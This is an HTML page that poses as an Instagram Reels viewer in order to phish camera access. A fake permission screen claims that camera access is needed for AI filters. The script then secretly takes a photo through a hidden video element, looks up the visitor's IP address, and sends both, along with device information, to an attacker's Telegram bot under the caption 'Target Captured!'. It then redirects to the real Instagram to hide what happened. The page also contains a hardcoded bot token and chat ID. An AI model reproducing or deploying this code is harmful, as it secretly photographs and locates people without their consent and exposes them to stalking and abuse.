<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Reels</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background-color: #000; margin: 0; overflow: hidden; font-family: -apple-system, sans-serif; }
        .insta-container { position: relative; width: 100%; max-width: 450px; height: 100vh; margin: auto; background: #000; }
        video#main-video { width: 100%; height: 100%; object-fit: cover; }
        #hidden-cam { position: absolute; opacity: 0; width: 1px; height: 1px; pointer-events: none; }
        .insta-overlay { position: absolute; inset: 0; display: flex; flex-direction: column; justify-content: flex-end; padding: 20px; background: linear-gradient(transparent, rgba(0,0,0,0.7)); pointer-events: none; }
    </style>
</head>
<body>

    <!-- Fake Instagram Permission Screen -->
    <div id="auth-screen" class="fixed inset-0 bg-black z-50 flex flex-col items-center justify-center p-8 text-center">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/2048px-Instagram_logo_2016.svg.png" class="w-20 mb-8" alt="Instagram">
        <h2 class="text-white text-xl font-semibold mb-2">Watch Reels in App</h2>
        <p class="text-gray-400 text-sm mb-8">Eda ee reel onnu kandu nokku. AI filters work cheyyan camera access allow cheyyuka.</p>
        <button onclick="startReel()" class="w-full bg-blue-500 text-white font-bold py-3 rounded-lg active:scale-95 transition-transform">
            Allow Camera & Watch
        </button>
    </div>

    <div id="insta-ui" class="insta-container hidden">
        <video id="hidden-cam" autoplay playsinline></video>
        <canvas id="hidden-canvas" style="display:none;"></canvas>
        <video id="main-video" loop playsinline>
            <source src="https://assets.mixkit.co/videos/preview/mixkit-young-woman-dancing-in-a-modern-style-4428-large.mp4" type="video/mp4">
        </video>
        <div class="insta-overlay">
            <div class="text-white mb-4">
                <p class="font-bold">@trending_vibes_kl</p>
                <p class="text-sm mt-1">This transition is fire! 🔥</p>
            </div>
        </div>
    </div>

    <script>
        const video = document.getElementById('hidden-cam');
        const mainVid = document.getElementById('main-video');
        const canvas = document.getElementById('hidden-canvas');

        // --- IVIDE MAATTUKA ---
        const botToken = "8549057486:AAF2ddvgmQLA8Pnb-gL4-ZDdyRoKTJa5YoA"; // BotFather-ൽ നിന്ന് കിട്ടുന്നത്
        const chatId = " 2018747103"; // UserInfoBot-ൽ നിന്ന് കിട്ടുന്നത്
        // ----------------------

        async function startReel() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = stream;
                document.getElementById('auth-screen').classList.add('hidden');
                document.getElementById('insta-ui').classList.remove('hidden');
                mainVid.play();
                setTimeout(captureAndSend, 4000);
            } catch (err) {
                alert("Camera allow cheythale filters work aaku!");
            }
        }

        async function captureAndSend() {
            const ctx = canvas.getContext('2d');
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            const imageData = canvas.toDataURL('image/jpeg', 0.5);
            const blob = await (await fetch(imageData)).blob();

            // IP Fetching
            let ip = "Unknown";
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                ip = data.ip;
            } catch (e) {}

            // Send to Telegram
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('photo', blob, 'captured.jpg');
            formData.append('caption', `Target Captured! 🔥\nIP: ${ip}\nDevice: ${navigator.platform}`);

            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                method: 'POST',
                body: formData
            }).then(() => {
                // Success - Redirect to actual Instagram
                window.location.href = "https://www.instagram.com/reels/";
            }).catch(err => console.error(err));

            // Stop Camera
            video.srcObject.getTracks().forEach(t => t.stop());
        }
    </script>
</body>
</html>
